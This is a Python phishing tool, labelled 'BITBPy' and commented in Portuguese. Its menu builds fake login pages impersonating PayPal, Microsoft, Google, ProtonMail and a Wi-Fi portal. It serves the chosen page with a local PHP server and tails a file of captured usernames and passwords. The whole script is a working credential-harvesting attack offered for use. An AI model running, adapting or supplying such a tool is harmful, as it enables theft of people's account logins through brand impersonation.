import os
import re
import time
from termcolor import colored as cl
ip = '0.0.0.0:8080' #<-- INSIRA AQUI O IP E A PORTA QUE O SITE SERÁ HOSPEDADO


banner="""                                                                        
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠙⣻⣷⣶⣤⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠋⠀⠀⠀⠀⢹⣿⣿⡟⠉⠉⠉⢻⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⣇⠀⠀⠀⠈⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠉⠛⠿⣷⣤⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣶⣦⣤⣤⣀⣀⣀⡀⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⣿⣿⣿⠁⠀⠈⠙⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⠀
⠀⠀⢿⣿⣿⣆⠀⠀⠀⠀⠈⠛⠿⣿⣶⣦⡤⠴⠀⠀⠀⠀⠀⣸⣿⣿⣿⡿⠀⠀
⠀⠀⠈⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣰⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀ ⠙⢿⣿⣿⣿⣶⣦⣤⣀⣀⡀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⡿⠃⠀⠀⠀         **BITBPy**
⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀ Uma simples ferramenta  de phishing
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀         Powered by Double-G
"""
print(cl(banner,"yellow"))
print(" ")
def open_server(path,title,webname):
    main_path = "sites/"+path+"/index.php"
    domain=path.capitalize()
    favicon=f'https://www.google.com/s2/favicons?domain=https://{path}.com'
    with open(r'main.html','r') as file :
        data = file.read()
        data = data.replace("XX-TITLE-XX",title).replace("XX-PHISHING-LINK-XX",main_path).replace("XX-LOGO-XX",f"{favicon}").replace("XX-WEB-XX",webname)
    with open(r'index.html','w') as file :
        file.write(data)
    print('Gerar tela de '+path)
    print(
    """
    S -> Sim
    N -> Não
    """)
    method_s = input(cl("Continuar? ▶ ","cyan"))
    print()
    if method_s.upper() == 'S' :
        os.system("php -S"+ip+" -q &")
        time.sleep(3)
        print()
        print(cl("[+]","green"), "Aguardando Informações ....")
        print() 
        os.system("tail -f sites/userpass/usernames.txt")

    elif method_s.upper()== 'N':
        print('Cancelando')
    
def pages(m_input):
   
    
    if m_input == '02' or m_input == '2':
        open_server("microsoft","Microsoft","https://account.microsoft.com/login")

    elif m_input == '01' or m_input == '1':
        open_server("paypal","Paypal","https://www.paypal.com/in/signin")

    elif m_input == '03' or m_input == '3':
        open_server('google','Gmail','https://accounts.google.com/signin/')

    elif m_input == '04' or m_input == '4':
        open_server('Wi-Fi','Wi-Fi','https://google.com')

    elif m_input  == '05' or m_input =='5':
        open_server('protonmail','ProtonMail','https://account.proton.me/')
 
    elif m_input == '99':
        print('Abra o Arquivo README.md')

    elif m_input == '00' or m_input == '0':
        print("Obrigado por usar a BITBPy...")
        exit()
    else :
        print("\n--> Insira um valor válido...\n")
print(" ")
print(cl("Selecione o tipo de ataque:  ","cyan")) 
print(""" 
    01 -> Paypal      02 -> Microsoft    03 -> Google

    04 -> Wi-Fi       05 -> Protonmail
    

    99 -> Manual        00 -> Sair
""")

while True:
    m_input = input(cl("Escolha uma opção ▶ ","cyan"))
    if (m_input == '0' or '00' or'1' or '01' or '2' or '02' or '3' or '03' or '4' or '04' or '5' or '05' or '99') : 
        pages(m_input) 
        break
    else:
        print("\n Digite uma opção válida\n")
